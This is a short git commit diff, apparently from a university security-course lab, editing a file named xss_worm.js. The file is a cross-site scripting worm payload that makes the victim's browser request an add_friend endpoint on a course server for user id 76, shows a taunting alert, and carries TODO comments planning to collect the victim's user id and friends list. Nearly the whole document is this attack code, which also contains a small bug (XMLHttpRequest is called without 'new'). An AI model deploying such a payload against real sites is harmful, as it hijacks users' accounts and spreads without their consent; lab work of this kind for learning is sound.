38ea3aaf5d1f3fa3b0b6ce29ca09db16b1c46291
avm7177 <amthy15@gmail.com>
2021-04-02 13:40:11 -0400

    trying xmlhttprequest

--- xss_worm.js
+++ xss_worm.js
@@ -1,5 +1,8 @@
 // TODO: get info
 //      - user id
 //      - friends list
-fetch('http://csec380-core.csec.rit.edu:86/add_friend?id=76')
 alert('get kek\'d')
+const http = XMLHttpRequest();
+const url = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=76';
+http.open("GET", url);
+http.send();
